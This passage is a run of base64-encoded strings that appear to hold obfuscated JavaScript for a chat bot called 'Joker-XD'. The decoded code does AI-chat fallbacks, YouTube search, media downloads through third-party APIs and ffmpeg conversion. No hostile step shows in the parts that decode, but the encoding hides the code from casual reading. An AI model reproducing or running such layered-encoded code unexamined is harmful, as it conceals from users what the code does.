xdlpHVnNPaUJQVUVWT1VrOVZWRVZTWDAxUFJFVk1MQW9nSUNBZ0lDQWdJQ0FnYldWemMyRm5aWE1LSUNBZ0lDQWdJQ0I5TEFvZ0lDQWdJQ0FnSUhzS0lDQWdJQ0FnSUNBZ0lIUnBiV1Z2ZFhRNklEWXdNREF3TEFvZ0lDQWdJQ0FnSUNBZ2RtRnNhV1JoZEdWVGRHRjBkWE02SUNncElEMCtJSFJ5ZFdVc0NpQWdJQ0FnSUNBZ0lDQm9aV0ZrWlhKek9pQjdDaUFnSUNBZ0lDQWdJQ0FnSUVGMWRHaHZjbWw2WVhScGIyNDZJQT09","TEFvZ0lDQWdJQ0FnSUNBZ0lDQWlRMjl1ZEdWdWRDMVVlWEJsSWpvZ0ltRndjR3hwWTJGMGFXOXVMMnB6YjI0aUxBb2dJQ0FnSUNBZ0lDQWdJQ0FpU0ZSVVVDMVNaV1psY21WeUlqb2dJbWgwZEhCek9pOHZhbTlyWlhJdGVHUXViRzlqWVd3aUxBb2dJQ0FnSUNBZ0lDQWdJQ0FpV0MxVWFYUnNaU0k2SUNKS2IydGxjaTFZUkNJS0lDQWdJQ0FnSUNBZ0lIMEtJQ0FnSUNBZ0lDQjlDaUFnSUNBZ0lDazdDaUFnSUNBZ0lHTnZibk4wSUhRZ1BTQmtZWFJoUHk1amFHOXBZMlZ6UHk1Yk1GMC9MbTFsYzNOaFoyVS9MbU52Ym5SbGJuUTdDaUFnSUNBZ0lHbG1JQ2h6ZEdGMGRYTWdQQ0EwTURBZ0ppWWdkQ0FtSmlCVGRISnBibWNvZENrdWRISnBiU2dwS1NCeVpYUjFjbTRnVTNSeWFXNW5LSFFwTG5SeWFXMG9LVHNLSUNBZ0lDQWdjbVYwZFhKdUlHNTFiR3c3Q2lBZ0lDQjlMQW9nSUNBZ0x5OGdNaWtnUzJWcGRHZ2dRVWtnWm1Gc2JHSmhZMnNnS0hOcGJtZHNaU0J3Y205dGNIUWdLeUJ6YUc5eWRDQmpiMjUwWlhoMEtRb2dJQ0FnWVhONWJtTWdLQ2tnUFQ0Z2V3b2dJQ0FnSUNCbWIzSWdLR052Ym5OMElHMXZaR1ZzSUc5bUlGc2laM0IwSWl3Z0ltMXBjM1J5WVd3aUxDQWlhV3hoYldFaUxDQWlZMmhoZEdkd2REUWlYU2tnZXdvZ0lDQWdJQ0FnSUhSeWVTQjdDaUFnSUNBZ0lDQWdJQ0JqYjI1emRDQjdJR1JoZEdFZ2ZTQTlJR0YzWVdsMElHRjRhVzl6TG1kbGRDZz0=","TENCN0NpQWdJQ0FnSUNBZ0lDQWdJQzR1TGtGWVNVOVRYMFJNTENCMGFXMWxiM1YwT2lBME5UQXdNQW9nSUNBZ0lDQWdJQ0FnZlNrN0NpQWdJQ0FnSUNBZ0lDQnBaaUFvWkdGMFlUOHVjM1JoZEhWeklDWW1JR1JoZEdFL0xuSmxjM1ZzZENrZ2NtVjBkWEp1SUZOMGNtbHVaeWhrWVhSaExuSmxjM1ZzZENrdWRISnBiU2dwT3dvZ0lDQWdJQ0FnSUNBZ2FXWWdLSFI1Y0dWdlppQmtZWFJoUHk1eVpYTjFiSFFnUFQwOUlDSnpkSEpwYm1jaUlDWW1JR1JoZEdFdWNtVnpkV3gwTG5SeWFXMG9LU2tnY21WMGRYSnVJR1JoZEdFdWNtVnpkV3gwTG5SeWFXMG9LVHNLSUNBZ0lDQWdJQ0I5SUdOaGRHTm9JSHQ5Q2lBZ0lDQWdJSDBLSUNBZ0lDQWdjbVYwZFhKdUlHNTFiR3c3Q2lBZ0lDQjlMQW9nSUNBZ0x5OGdNeWtnUm5KbFpTQjNiM0pyWlhKekNpQWdJQ0JoYzNsdVl5QW9LU0E5UGlCN0NpQWdJQ0FnSUdOdmJuTjBJSFZ5YkhNZ1BTQmJDaUFnSUNBZ0lDQWc=","TEFvZ0lDQWdJQ0FnSUE9PQ==","Q2lBZ0lDQWdJRjA3Q2lBZ0lDQWdJR1p2Y2lBb1kyOXVjM1FnZFNCdlppQjFjbXh6S1NCN0NpQWdJQ0FnSUNBZ2RISjVJSHNLSUNBZ0lDQWdJQ0FnSUdOdmJuTjBJSHNnWkdGMFlTQjlJRDBnWVhkaGFYUWdZWGhwYjNNdVoyVjBLSFVzSUhzZ0xpNHVRVmhKVDFOZlJFd3NJSFJwYldWdmRYUTZJRE13TURBd0lIMHBPd29nSUNBZ0lDQWdJQ0FnWTI5dWMzUWdkQ0E5SUdSaGRHRS9MbVJoZEdFL0xuSmxjM0J2Ym5ObENpQWdJQ0FnSUNBZ0lDQWdJSHg4SUdSaGRHRS9MbVJoZEdFL0xtTm9iMmxqWlhNL0xsc3dYVDh1YldWemMyRm5aVDh1WTI5dWRHVnVkQW9nSUNBZ0lDQWdJQ0FnSUNCOGZDQmtZWFJoUHk1eVpYTndiMjV6WlFvZ0lDQWdJQ0FnSUNBZ0lDQjhmQ0JrWVhSaFB5NXlaWE4xYkhRS0lDQWdJQ0FnSUNBZ0lDQWdmSHdnS0hSNWNHVnZaaUJrWVhSaElEMDlQU0FpYzNSeWFXNW5JaUEvSUdSaGRHRWdPaUJ1ZFd4c0tUc0tJQ0FnSUNBZ0lDQWdJR2xtSUNoMElDWW1JRk4wY21sdVp5aDBLUzUwY21sdEtDa3BJSEpsZEhWeWJpQlRkSEpwYm1jb2RDa3VkSEpwYlNncE93b2dJQ0FnSUNBZ0lIMGdZMkYwWTJnZ2UzMEtJQ0FnSUNBZ2ZRb2dJQ0FnSUNCeVpYUjFjbTRnYm5Wc2JEc0tJQ0FnSUgwc0NpQWdJQ0F2THlBMEtTQndiMnhzYVc1aGRHbHZibk1LSUNBZ0lHRnplVzVqSUNncElEMCtJSHNLSUNBZ0lDQWdkSEo1SUhzS0lDQWdJQ0FnSUNCamIyNXpkQ0J5SUQwZ1lYZGhhWFFnWVhocGIzTXVaMlYwS0NKb2RIUndjem92TDNSbGVIUXVjRzlzYkdsdVlYUnBiMjV6TG1GcEx5SWdLeUJsYm1OdlpHVlZVa2xEYjIxd2IyNWxiblFvY1ZkcGRHaERiMjUwWlhoMEtTd2dld29nSUNBZ0lDQWdJQ0FnZEdsdFpXOTFkRG9nTmpBd01EQXNJSFpoYkdsa1lYUmxVM1JoZEhWek9pQW9LU0E5UGlCMGNuVmxMQ0J5WlhOd2IyNXpaVlI1Y0dVNklDSjBaWGgwSWdvZ0lDQWdJQ0FnSUgwcE93b2dJQ0FnSUNBZ0lHTnZibk4wSUc5MWRDQTlJSFI1Y0dWdlppQnlMbVJoZEdFZ1BUMDlJQ0p6ZEhKcGJtY2lJRDhnY2k1a1lYUmhJRG9nS0hJdVpHRjBZVDh1ZEdWNGRDQjhmQ0FpSWlrN0NpQWdJQ0FnSUNBZ2FXWWdLRzkxZENBbUppQnlMbk4wWVhSMWN5QThJRFF3TUNrZ2NtVjBkWEp1SUZOMGNtbHVaeWh2ZFhRcExuUnlhVzBvS1RzS0lDQWdJQ0FnZlNCallYUmphQ0I3ZlFvZ0lDQWdJQ0J5WlhSMWNtNGdiblZzYkRzS0lDQWdJSDBLSUNCZE93b2dJR1p2Y2lBb1kyOXVjM1FnWm00Z2IyWWdjMjkxY21ObGN5a2dld29nSUNBZ2RISjVJSHNLSUNBZ0lDQWdZMjl1YzNRZ1lXNXpJRDBnWVhkaGFYUWdabTRvS1RzS0lDQWdJQ0FnYVdZZ0tHRnVjeUFtSmlCaGJuTXViR1Z1WjNSb0lENGdNU2tnY21WMGRYSnVJR0Z1Y3k1emJHbGpaU2d3TENBME1EQXdLVHNLSUNBZ0lIMGdZMkYwWTJnZ2UzMEtJQ0I5Q2lBZ2RHaHliM2NnYm1WM0lFVnljbTl5S0NKQmJHd2dRVWtnYzI5MWNtTmxjeUJtWVdsc1pXUWlLVHNLZlFvZ0lHeGxkQ0JzWVhOME93b2dJR1p2Y2lBb2JHVjBJR2tnUFNBd095QnBJRHdnY21WMGNtbGxjenNnYVNzcktTQjdDaUFnSUNCMGNua2dleUJ5WlhSMWNtNGdZWGRoYVhRZ1ptNG9LVHNnZlNCallYUmphQ0FvWlNrZ2V5QnNZWE4wSUQwZ1pUc2dZWGRoYVhRZ2JtVjNJRkJ5YjIxcGMyVW9jaUE5UGlCelpYUlVhVzFsYjNWMEtISXNJRFV3TUNBcUlDaHBJQ3NnTVNrcEtUc2dmUW9nSUgwS0lDQjBhSEp2ZHlCc1lYTjBJSHg4SUc1bGR5QkZjbkp2Y2lnaWNtVnhkV1Z6ZENCbVlXbHNaV1FpS1RzS2ZRb0tJQ0F2S0Q4NmFIUjBjSE0vT2x3dlhDOHBQeWcvT25sdmRYUjFYQzVpWlZ3dmZDZy9PbmQzZDF3dWZHMWNMaWsvZVc5MWRIVmlaVnd1WTI5dFhDOG9QenAzWVhSamFGdy9kajE4ZGx3dmZHVnRZbVZrWEM5OGMyaHZjblJ6WEM5OGNHeGhlV3hwYzNSY1AyeHBjM1E5S1Q4cEtGdGhMWHBCTFZvd0xUbGZMVjE3TVRGOUtTOXBMblJsYzNRb2RTQjhmQ0FpSWlrN0Nnb2dJQzh2SUZCeVpXWmxjaUJzYjJOaGJDQjVkQzF6WldGeVkyZ2dLSEpsYkdsaFlteGxLUzRnUm1Gc2JDQmlZV05ySUhSdklHVjRkR1Z5Ym1Gc0lHOXViSGtnYVdZZ2JtVmxaR1ZrTGdvZ0lIUnllU0I3Q2lBZ0lDQmpiMjV6ZENCeUlEMGdZWGRoYVhRZ2VYUnpLSEYxWlhKNUtUc0tJQ0FnSUdsbUlDaHlQeTUyYVdSbGIzTS9MbXhsYm1kMGFDa2dld29nSUNBZ0lDQmpiMjV6ZENCMklEMGdjaTUyYVdSbGIzTmJNRjA3Q2lBZ0lDQWdJSEpsZEhWeWJpQjdDaUFnSUNBZ0lDQWdkbWxrWlc5VmNtdzZJSFl1ZFhKc0xBb2dJQ0FnSUNBZ0lIUnBkR3hsT2lCMkxuUnBkR3hsSUh4OElDSmhkV1JwYnlJc0NpQWdJQ0FnSUNBZ1pIVnlZWFJwYjI0NklIWXVkR2x0WlhOMFlXMXdJSHg4SUhZdVpIVnlZWFJwYjI0L0xuUnBiV1Z6ZEdGdGNDd0tJQ0FnSUNBZ0lDQjJhV1YzY3pvZ2RpNTJhV1YzY3l3S0lDQWdJQ0FnSUNCMGFIVnRZbTVoYVd3NklIWXVkR2gxYldKdVlXbHNMQW9nSUNBZ0lDQWdJR2xrT2lCMkxuWnBaR1Z2U1dRS0lDQWdJQ0FnZlRzS0lDQWdJSDBLSUNCOUlHTmhkR05vSUh0OUNpQWdkSEo1SUhzS0lDQWdJR052Ym5OMElIc2daR0YwWVNCOUlEMGdZWGRoYVhRZ1lYaHBiM011WjJWMEtBPT0=","TENCN0lDNHVMa0ZZU1U5VFgwUk1MQ0IwYVcxbGIzVjBPaUF4TWpBd01DQjlLVHNLSUNBZ0lHbG1JQ2doWkdGMFlUOHVjM1JoZEhWeklIeDhJQ0ZrWVhSaFB5NXlaWE4xYkhRL0xteGxibWQwYUNrZ2RHaHliM2NnYm1WM0lFVnljbTl5S0dSaGRHRS9MbTFsYzNOaFoyVWdmSHdnSWs1dklISmxjM1ZzZEhNaUtUc0tJQ0FnSUdOdmJuTjBJR1VnUFNCa1lYUmhMbkpsYzNWc2RGc3dYVHNLSUNBZ0lISmxkSFZ5YmlCN0NpQWdJQ0FnSUhacFpHVnZWWEpzT2lBaWFIUjBjSE02THk5NWIzVjBkV0psTG1OdmJTOTNZWFJqYUQ5MlBTSWdLeUJsTG1sa0xBb2dJQ0FnSUNCMGFYUnNaVG9nWlM1MGFYUnNaU0I4ZkNBaVlYVmthVzhpTEFvZ0lDQWdJQ0JrZFhKaGRHbHZiam9nWlM1a2RYSmhkR2x2Yml3S0lDQWdJQ0FnZG1sbGQzTTZJR1V1ZG1sbGQzTXNDaUFnSUNBZ0lIUm9kVzFpYm1GcGJEb2daUzUwYUhWdFltNWhhV3dzQ2lBZ0lDQWdJR2xrT2lCbExtbGtDaUFnSUNCOU93b2dJSDBnWTJGMFkyZ2dLR1VwSUhzS0lDQWdJSFJvY205M0lHNWxkeUJGY25KdmNpaGxQeTV0WlhOellXZGxJSHg4SUNKT2J5QnlaWE4xYkhSeklpazdDaUFnZlFwOUNnb3ZMeUF0TFMwdExTMHRMUzB0SUVGMVpHbHZMMVpwWkdWdklHUnZkMjVzYjJGa1pYSWc0b0NVSUU5T1RGa2dVM1Z3Y21WdFpTQkJVRWtnTFMwdExTMHRMUzB0TFFvZ0lHTnZibk4wSUhKbGN5QTlJR0YzWVdsMElIUnllVkpsY1hWbGMzUW9LQ2tnUFQ0S0lDQWdJR0Y0YVc5ekxtZGxkQ2c9","TENCN0lDNHVMa0ZZU1U5VFgwUk1MQ0IwYVcxbGIzVjBPaUF6TURBd01DQjlLUW9nSUNrN0NpQWdZMjl1YzNRZ1pDQTlJSEpsY3o4dVpHRjBZVHNLSUNCamIyNXpkQ0JzYVc1cklEMGdaRDh1Wkc5M2JteHZZV1JWY213Z2ZId2daRDh1Wkc5M2JteHZZV1FnZkh3Z1pEOHVjbVZ6ZFd4MFB5NXRjRE1nZkh3Z1pEOHVjbVZ6ZFd4MFB5NWtiM2R1Ykc5aFpDQjhmQ0JrUHk1dGNETWdmSHdnWkQ4dWRYSnNJSHg4SUdRL0xteHBibXM3Q2lBZ2FXWWdLR3hwYm1zZ0ppWWdVM1J5YVc1bktHeHBibXNwTG5OMFlYSjBjMWRwZEdnb0ltaDBkSEFpS1NrZ2NtVjBkWEp1SUd4cGJtczdDaUFnTHk4Z1ptRnNiR0poWTJzZ2MyRnRaU0JvYjNOMElIbDBiWEEwSUdGMVpHbHZJR2xtSUhsMGJYQXpJSEJoZEdnZ1pHbG1abVZ5Y3dvZ0lHTnZibk4wSUhKbGN6SWdQU0JoZDJGcGRDQjBjbmxTWlhGMVpYTjBLQ2dwSUQwK0NpQWdJQ0JoZUdsdmN5NW5aWFFv","TENCN0lDNHVMa0ZZU1U5VFgwUk1MQ0IwYVcxbGIzVjBPaUF6TURBd01DQjlLUW9nSUNrN0NpQWdZMjl1YzNRZ1pESWdQU0J5WlhNeVB5NWtZWFJoT3dvZ0lHTnZibk4wSUd4cGJtc3lJRDBnWkRJL0xtUnZkMjVzYjJGa1ZYSnNJSHg4SUdReVB5NWtiM2R1Ykc5aFpDQjhmQ0JrTWo4dWNtVnpkV3gwUHk1dGNETWdmSHdnWkRJL0xuSmxjM1ZzZEQ4dVlYVmthVzhnZkh3Z1pESS9MbTF3TXlCOGZDQmtNajh1ZFhKc093b2dJR2xtSUNoc2FXNXJNaUFtSmlCVGRISnBibWNvYkdsdWF6SXBMbk4wWVhKMGMxZHBkR2dvSW1oMGRIQWlLU2tnY21WMGRYSnVJR3hwYm1zeU93b2dJSFJvY205M0lHNWxkeUJGY25KdmNpZ2lVMjkxY21ObElIVnVZWFpoYVd4aFlteGxJaWs3Q24wS0NpOHFLaUJUYUdGeVpXUWdhR1ZzY0dWeU9pQnlaWE52YkhabElIRjFaWEo1SU9LR2tpQjVkQ0IxY213Z0t5QjBhWFJzWlNBcUx3b2dJR3hsZENCMWNtd2dQU0J4TENCMGFYUnNaU0E5SUNKaGRXUnBieUk3Q2lBZ2FXWWdLQ0ZwYzFsMFZYSnNLSEVwS1NCN0NpQWdJQ0IwY25rZ2V3b2dJQ0FnSUNCamIyNXpkQ0J6SUQwZ1lYZGhhWFFnYTJWcGRHaFRaV0Z5WTJoWmRITW9jU2s3Q2lBZ0lDQWdJSFZ5YkNBOUlITXVkbWxrWlc5VmNtdzdJSFJwZEd4bElEMGdjeTUwYVhSc1pUc0tJQ0FnSUgwZ1kyRjBZMmdnZXdvZ0lDQWdJQ0JqYjI1emRDQnlJRDBnWVhkaGFYUWdlWFJ6S0hFcE93b2dJQ0FnSUNCcFppQW9JWEkvTG5acFpHVnZjejh1YkdWdVozUm9LU0IwYUhKdmR5QnVaWGNnUlhKeWIzSW9JazV2SUhKbGMzVnNkSE1pS1RzS0lDQWdJQ0FnZFhKc0lEMGdjaTUyYVdSbGIzTmJNRjB1ZFhKc095QjBhWFJzWlNBOUlISXVkbWxrWlc5eld6QmRMblJwZEd4bE93b2dJQ0FnZlFvZ0lIMEtJQ0J5WlhSMWNtNGdleUIxY213c0lIUnBkR3hsSUgwN0NuMEtDaThxS2lCVGFHRnlaV1FnYzJWdVpDQmhkV1JwYnlCaWRXWm1aWElnS2k4S0lDQnBaaUFvSVdKMVpqOHViR1Z1WjNSb0tTQjBhSEp2ZHlCdVpYY2dSWEp5YjNJb0lrVnRjSFI1SUdGMVpHbHZJaWs3Q2lBZ2RISjVJSHNnWW5WbUlEMGdZWGRoYVhRZ1luVm1abVZ5Vkc5TmNETW9ZblZtS1RzZ2ZTQmpZWFJqYUNCN2ZRb2dJR0YzWVdsMElITnZZMnN1YzJWdVpFMWxjM05oWjJVb2FtbGtMQ0I3Q2lBZ0lDQmhkV1JwYnpvZ1luVm1MQW9nSUNBZ2JXbHRaWFI1Y0dVNklDSmhkV1JwYnk5dGNHVm5JaXdLSUNBZ0lHWnBiR1ZPWVcxbE9pQT0=","TEFvZ0lDQWdjSFIwT2lCbVlXeHpaUW9nSUgwc0lIc2djWFZ2ZEdWa09pQnRjMmNnZlNrN0NuMEtDaTh2SUV4bFoyRmplU0J0ZFd4MGFTMW1ZV3hzWW1GamF5QW9hMlZ3ZENCbWIzSWdZVzU1SUdsdWRHVnlibUZzSUhWelpTa0tJQ0JqYjI1emRDQmhjR2x6SUQwZ1cyUnNRWFZrYVc5RmJHbDBaU3dnWkd4QmRXUnBiMWwxY0hKaExDQmtiRUYxWkdsdlQydGhkSE4xTENCa2JFRjFaR2x2UzJWcGRHaGRPd29nSUd4bGRDQnNZWE4wUlhKeUlEMGdJa0YxWkdsdklITnZkWEpqWlNCMWJtRjJZV2xzWVdKc1pTSTdDaUFnWm05eUlDaGpiMjV6ZENCbWJpQnZaaUJoY0dsektTQjdDaUFnSUNCMGNua2dld29nSUNBZ0lDQmpiMjV6ZENCc2FXNXJJRDBnWVhkaGFYUWdabTRvZFhKc0tUc0tJQ0FnSUNBZ2FXWWdLR3hwYm1zZ0ppWWdkSGx3Wlc5bUlHeHBibXNnUFQwOUlDSnpkSEpwYm1jaUlDWW1JR3hwYm1zdWMzUmhjblJ6VjJsMGFDZ2lhSFIwY0NJcEtTQnlaWFIxY200Z2JHbHVhenNLSUNBZ0lIMGdZMkYwWTJnZ0tHVXBJSHNLSUNBZ0lDQWdiR0Z6ZEVWeWNpQTlJR1UvTG0xbGMzTmhaMlVnZkh3Z1UzUnlhVzVuS0dVcE93b2dJQ0FnZlFvZ0lIMEtJQ0IwYUhKdmR5QnVaWGNnUlhKeWIzSW9iR0Z6ZEVWeWNpazdDbjBLQ2lBZ0x5OGdUR2wyWlMxMFpYTjBaV1FnWTJGelkyRmtaVG9nUTNsd2FHVnlJT0tHa2lCSVpXTjBiM0pOWVc1MVpXd2c0b2FTSUZOMWNISmxiV1VLSUNBdkx5QW9SR0YyYVdRZ1EzbHlhV3dnYm1WbFpITWdjR0ZwWkNCQlVFa2dhMlY1SU9LQWxDQnphMmx3Y0dWa0tRb2dJR052Ym5OMElITnZkWEpqWlhNZ1BTQmJDaUFnSUNCaGMzbHVZeUFvS1NBOVBpQjdDaUFnSUNBZ0lHTnZibk4wSUhzZ1pHRjBZU0I5SUQwZ1lYZGhhWFFnWVhocGIzTXVaMlYwS0FvZ0lDQWdJQ0FnSUE9PQ==","TEFvZ0lDQWdJQ0FnSUhzZ0xpNHVRVmhKVDFOZlJFd3NJSFJwYldWdmRYUTZJRE0xTURBd0lIMEtJQ0FnSUNBZ0tUc0tJQ0FnSUNBZ1kyOXVjM1FnWkc5M2JteHZZV1FnUFNCa1lYUmhQeTV5WlhOMWJIUS9MbVJ2ZDI1c2IyRmtYM1Z5YkNCOGZDQmtZWFJoUHk1eVpYTjFiSFEvTG1SdmQyNXNiMkZrSUh4OElHUmhkR0UvTG1SdmQyNXNiMkZrWDNWeWJEc0tJQ0FnSUNBZ2FXWWdLR1JoZEdFL0xuTjFZMk5sYzNNZ0ppWWdaRzkzYm14dllXUWdKaVlnVTNSeWFXNW5LR1J2ZDI1c2IyRmtLUzV6ZEdGeWRITlhhWFJvS0NKb2RIUndJaWtwSUhzS0lDQWdJQ0FnSUNCeVpYUjFjbTRnZXdvZ0lDQWdJQ0FnSUNBZ1pHOTNibXh2WVdRc0NpQWdJQ0FnSUNBZ0lDQjBhWFJzWlRvZ1pHRjBZUzV5WlhOMWJIUS9MblJwZEd4bElIeDhJQ0oyYVdSbGJ5SXNDaUFnSUNBZ0lDQWdJQ0IwYUhWdFltNWhhV3c2SUdSaGRHRXVjbVZ6ZFd4MFB5NTBhSFZ0WW01aGFXd2dmSHdnYm5Wc2JDd0tJQ0FnSUNBZ0lDQWdJSEYxWVd4cGRIazZJR1JoZEdFdWNtVnpkV3gwUHk1eGRXRnNhWFI1SUh4OElHNTFiR3dLSUNBZ0lDQWdJQ0I5T3dvZ0lDQWdJQ0I5Q2lBZ0lDQWdJSFJvY205M0lHNWxkeUJGY25KdmNpZ2lVMjkxY21ObElIVnVZWFpoYVd4aFlteGxJaWs3Q2lBZ0lDQjlMQW9nSUNBZ1lYTjVibU1nS0NrZ1BUNGdld29nSUNBZ0lDQmpiMjV6ZENCN0lHUmhkR0VnZlNBOUlHRjNZV2wwSUdGNGFXOXpMbWRsZENnS0lDQWdJQ0FnSUNBPQ==","TEFvZ0lDQWdJQ0FnSUhzZ0xpNHVRVmhKVDFOZlJFd3NJSFJwYldWdmRYUTZJRE0xTURBd0lIMEtJQ0FnSUNBZ0tUc0tJQ0FnSUNBZ0x5OGdjbVZ6Y0c5dWMyVTZJSHNnYzNSaGRIVnpMQ0IwYVhSc1pTd2dkbWxrWlc5ek9pQjdJQ0l4TkRRaU9pQjFjbXdzSUNJeU5EQWlPaUIxY213c0lDNHVMaUI5SUgwS0lDQWdJQ0FnYkdWMElHUnZkMjVzYjJGa0lEMGdiblZzYkRzS0lDQWdJQ0FnYkdWMElIRjFZV3hwZEhrZ1BTQnVkV3hzT3dvZ0lDQWdJQ0JqYjI1emRDQjJhV1J6SUQwZ1pHRjBZVDh1ZG1sa1pXOXpPd29nSUNBZ0lDQnBaaUFvZG1sa2N5QW1KaUIwZVhCbGIyWWdkbWxrY3lBOVBUMGdJbTlpYW1WamRDSXBJSHNLSUNBZ0lDQWdJQ0JqYjI1emRDQnJaWGx6SUQwZ1QySnFaV04wTG10bGVYTW9kbWxrY3lrS0lDQWdJQ0FnSUNBZ0lDNW1hV3gwWlhJb0tHc3BJRDArSUZOMGNtbHVaeWgyYVdSelcydGRJSHg4SUNJaUtTNXpkR0Z5ZEhOWGFYUm9LQ0pvZEhSd0lpa3BDaUFnSUNBZ0lDQWdJQ0F1YzI5eWRDZ29ZU3dnWWlrZ1BUNGdLSEJoY25ObFNXNTBLR0lzSURFd0tTQjhmQ0F3S1NBdElDaHdZWEp6WlVsdWRDaGhMQ0F4TUNrZ2ZId2dNQ2twT3dvZ0lDQWdJQ0FnSUdsbUlDaHJaWGx6TG14bGJtZDBhQ2tnZXdvZ0lDQWdJQ0FnSUNBZ2NYVmhiR2wwZVNBOUlHdGxlWE5iTUYwN0NpQWdJQ0FnSUNBZ0lDQmtiM2R1Ykc5aFpDQTlJSFpwWkhOYmEyVjVjMXN3WFYwN0NpQWdJQ0FnSUNBZ2ZRb2dJQ0FnSUNCOUNpQWdJQ0FnSUdsbUlDZ2haRzkzYm14dllXUXBJSHNLSUNBZ0lDQWdJQ0JrYjNkdWJHOWhaQ0E5SUdSaGRHRS9MblpwWkdWdklIeDhJR1JoZEdFL0xtUnZkMjVzYjJGa0lIeDhJR1JoZEdFL0xtMXdOQ0I4ZkNCa1lYUmhQeTV5WlhOMWJIUS9MblpwWkdWdk93b2dJQ0FnSUNCOUNpQWdJQ0FnSUdsbUlDaGtZWFJoUHk1emRHRjBkWE1nSmlZZ1pHOTNibXh2WVdRZ0ppWWdVM1J5YVc1bktHUnZkMjVzYjJGa0tTNXpkR0Z5ZEhOWGFYUm9LQ0pvZEhSd0lpa3BJSHNLSUNBZ0lDQWdJQ0J5WlhSMWNtNGdld29nSUNBZ0lDQWdJQ0FnWkc5M2JteHZZV1FzQ2lBZ0lDQWdJQ0FnSUNCMGFYUnNaVG9nWkdGMFlUOHVkR2wwYkdVZ2ZId2dJblpwWkdWdklpd0tJQ0FnSUNBZ0lDQWdJSFJvZFcxaWJtRnBiRG9nWkdGMFlUOHVkR2gxYldKdVlXbHNJSHg4SUc1MWJHd3NDaUFnSUNBZ0lDQWdJQ0J4ZFdGc2FYUjVPaUJ4ZFdGc2FYUjVJRDhnY1hWaGJHbDBlU0FySUNKd0lpQTZJRzUxYkd3S0lDQWdJQ0FnSUNCOU93b2dJQ0FnSUNCOUNpQWdJQ0FnSUhSb2NtOTNJRzVsZHlCRmNuSnZjaWdpVTI5MWNtTmxJSFZ1WVhaaGFXeGhZbXhsSWlrN0NpQWdJQ0I5TEFvZ0lDQWdZWE41Ym1NZ0tDa2dQVDRnZXdvZ0lDQWdJQ0JqYjI1emRDQjdJR1JoZEdFZ2ZTQTlJR0YzWVdsMElHRjRhVzl6TG1kbGRDZ0tJQ0FnSUNBZ0lDQT0=","TEFvZ0lDQWdJQ0FnSUhzZ0xpNHVRVmhKVDFOZlJFd3NJSFJwYldWdmRYUTZJRE0xTURBd0lIMEtJQ0FnSUNBZ0tUc0tJQ0FnSUNBZ1kyOXVjM1FnWkc5M2JteHZZV1FnUFNCa1lYUmhQeTVrYjNkdWJHOWhaRlZ5YkNCOGZDQmtZWFJoUHk1a2IzZHViRzloWkNCOGZDQmtZWFJoUHk1eVpYTjFiSFEvTG0xd05DQjhmQ0JrWVhSaFB5NXlaWE4xYkhRL0xtUnZkMjVzYjJGa0lIeDhJR1JoZEdFL0xtMXdOQ0I4ZkNCa1lYUmhQeTUxY213N0NpQWdJQ0FnSUdsbUlDaGtiM2R1Ykc5aFpDQW1KaUJUZEhKcGJtY29aRzkzYm14dllXUXBMbk4wWVhKMGMxZHBkR2dvSW1oMGRIQWlLU2tnZXdvZ0lDQWdJQ0FnSUhKbGRIVnliaUI3Q2lBZ0lDQWdJQ0FnSUNCa2IzZHViRzloWkN3S0lDQWdJQ0FnSUNBZ0lIUnBkR3hsT2lCa1lYUmhQeTUwYVhSc1pTQjhmQ0JrWVhSaFB5NXlaWE4xYkhRL0xuUnBkR3hsSUh4OElDSjJhV1JsYnlJc0NpQWdJQ0FnSUNBZ0lDQjBhSFZ0WW01aGFXdzZJR1JoZEdFL0xuUm9kVzFpYm1GcGJDQjhmQ0JrWVhSaFB5NXlaWE4xYkhRL0xuUm9kVzFpYm1GcGJDQjhmQ0J1ZFd4c0xBb2dJQ0FnSUNBZ0lDQWdjWFZoYkdsMGVUb2diblZzYkFvZ0lDQWdJQ0FnSUgwN0NpQWdJQ0FnSUgwS0lDQWdJQ0FnZEdoeWIzY2dibVYzSUVWeWNtOXlLQ0pUYjNWeVkyVWdkVzVoZG1GcGJHRmliR1VpS1RzS0lDQWdJSDBLSUNCZE93b0tJQ0JzWlhRZ2JHRnpkRVZ5Y2lBOUlDSldhV1JsYnlCemIzVnlZMlVnZFc1aGRtRnBiR0ZpYkdVaU93b2dJR1p2Y2lBb1kyOXVjM1FnWm00Z2IyWWdjMjkxY21ObGN5a2dld29nSUNBZ2RISjVJSHNLSUNBZ0lDQWdjbVYwZFhKdUlHRjNZV2wwSUhSeWVWSmxjWFZsYzNRb1ptNHNJREVwT3dvZ0lDQWdmU0JqWVhSamFDQW9aU2tnZXdvZ0lDQWdJQ0JzWVhOMFJYSnlJRDBnWlQ4dWJXVnpjMkZuWlNCOGZDQlRkSEpwYm1jb1pTazdDaUFnSUNCOUNpQWdmUW9nSUhSb2NtOTNJRzVsZHlCRmNuSnZjaWhzWVhOMFJYSnlLVHNLZlFvS0lDQmpiMjV6ZENCcGJrWWdQU0J3WVhSb0xtcHZhVzRvVFVWRVNVRmZSRWxTTENBPQ==","S1RzS0lDQmpiMjV6ZENCdmRYUkdJRDBnY0dGMGFDNXFiMmx1S0UxRlJFbEJYMFJKVWl3Zw==","S1RzS0lDQjBjbmtnZXdvZ0lDQWdabk11ZDNKcGRHVkdhV3hsVTNsdVl5aHBia1lzSUdKMVppazdDaUFnSUNCaGQyRnBkQ0JsZUdWalFYTjVibU1v","TENCN0lIUnBiV1Z2ZFhRNklEa3dNREF3SUgwcE93b2dJQ0FnY21WMGRYSnVJR1p6TG5KbFlXUkdhV3hsVTNsdVl5aHZkWFJHS1RzS0lDQjlJR1pwYm1Gc2JIa2dld29nSUNBZ2RISjVJSHNnWm5NdWRXNXNhVzVyVTNsdVl5aHBia1lwT3lCOUlHTmhkR05vSUh0OUNpQWdJQ0IwY25rZ2V5Qm1jeTUxYm14cGJtdFRlVzVqS0c5MWRFWXBPeUI5SUdOaGRHTm9JSHQ5Q2lBZ2ZRcDlDZ292S2lvZ1RtOXliV0ZzYVhwbElHRnVlU0J6WTNKaGNHVnlJSEpsYzNWc2RDQnBiblJ2SUdFZ2JXVmthV0VnVlZKTUlITjBjbWx1WnlBcUx3b2dJR2xtSUNnaGNpa2djbVYwZFhKdUlHNTFiR3c3Q2lBZ2FXWWdLSFI1Y0dWdlppQnlJRDA5UFNBaWMzUnlhVzVuSWlBbUppQnlMbk4wWVhKMGMxZHBkR2dvSW1oMGRIQWlLU2tnY21WMGRYSnVJSEk3Q2lBZ2FXWWdLRUZ5Y21GNUxtbHpRWEp5WVhrb2Npa3BJSHNLSUNBZ0lHWnZjaUFvWTI5dWMzUWdhWFJsYlNCdlppQnlLU0I3